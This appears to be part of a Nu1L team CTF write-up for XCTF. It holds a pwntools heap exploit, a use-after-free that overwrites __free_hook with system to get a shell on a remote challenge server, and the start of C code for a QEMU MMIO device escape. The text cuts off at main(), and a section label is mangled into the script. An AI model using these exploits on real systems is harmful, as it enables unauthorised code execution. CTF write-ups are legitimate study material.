XCTF WP
Author:Nu1L
XCTF WP
PWN
cpp
qemuzz
GAME
Reverse
divination
Web
mine1_1
mine2
pyer
webshell_1
hids
PWN
cpp
UAFlibcfree_hook
from pwn import *
# s = process("./chall")
s = remote("124.70.12.210","10002")
def add(idx,buf):
    s.sendlineafter("> ",str(0))
    s.sendafter("> ",buf)
    s.sendlineafter("> ",str(idx))
def edit(idx):
    s.sendlineafter("> ",str(1))
    s.sendlineafter("> ",str(idx))
for i in range(0x40):
    add(i,'\n')
context.terminal = ['notiterm', '-t', 'iterm', '-e']
edit(0)
qemuzz
s.send("\n")
edit(1)
s.recvuntil("> ")
heap = u64(s.recvline(keepends=False).ljust(8,'\x00'))-0x11eb0
success(hex(heap))
s.send(p64(heap+0x11f28)[:-2]+"\n")
add(0x40,'\n')
add(0x41,'\x01\x05\n')
edit(4)
libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00")-0x1ebbe0
success(hex(libc.address))
s.send(p64(libc.address+0x1ebbe0)[:-2]+"\n")
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
# gdb.attach(s,"b *$rebase(0x13c6)\nc")
edit(0x11)
s.send("\n")
edit(0x10)
s.send(p64(free_hook)[:-2]+"\n")
add(0xa0,'sh\n')
add(0xa1,p64(system)[:-2]+"\n")
add(0xa2,p64(system)[:-2]+"\n")
edit(0xa0)
s.interactive()
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#define PRINT_ERROR                                              \
    do                                                           \
    {                                                            \
        fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
                __LINE__, __FILE__, errno, strerror(errno));     \
        exit(1);                                                 \
    } while (0)
int mmio_fd = -1;
uint8_t *mmio_base = NULL;
int mmio_size = 0x1000;
void die(char *msg)
{
    puts(msg);
    exit(1);
}
void init_mmio()
{
    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | 
O_SYNC);
    if (mmio_fd < 0)
    {
        die("open mmio_fd");
    }
    mmio_base = (uint8_t *)mmap(0, mmio_size, PROT_READ | PROT_WRITE, 
MAP_SHARED, mmio_fd, 0);
    if (mmio_base == MAP_FAILED)
    {
        die("mmap mmio_base");
    }
    printf("mmio_base: %p\n", mmio_base);
}
uint8_t mmio_read(uint64_t addr)
{
    uint8_t ans = 0;
    ans = *(mmio_base + addr);
    return ans;
}
void mmio_write(uint64_t addr, uint32_t val)
{
    *(uint32_t *)(mmio_base + addr) = val;
}
uint64_t virt2phys(void *p)
{
    uint64_t virt = (uint64_t)p;
    // Assert page alignment
    assert((virt & 0xfff) == 0);
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        PRINT_ERROR;
    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);
    uint64_t phys;
    if (read(fd, &phys, 8) != 8)
        PRINT_ERROR;
    // Assert page present
    assert(phys & (1ULL << 63));
    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}
uint64_t leak(uint64_t offset)
{
    uint64_t ret = 0;
    ret += mmio_read(offset);
    ret += mmio_read(offset + 1) << 8;
    ret += mmio_read(offset + 2) << 16;
    ret += mmio_read(offset + 3) << 24;
    ret += mmio_read(offset + 4) << 32;
    ret += mmio_read(offset + 5) << 40;
    ret += mmio_read(offset + 6) << 48;
    ret += mmio_read(offset + 7) << 56;
    return ret;
}
int main()
{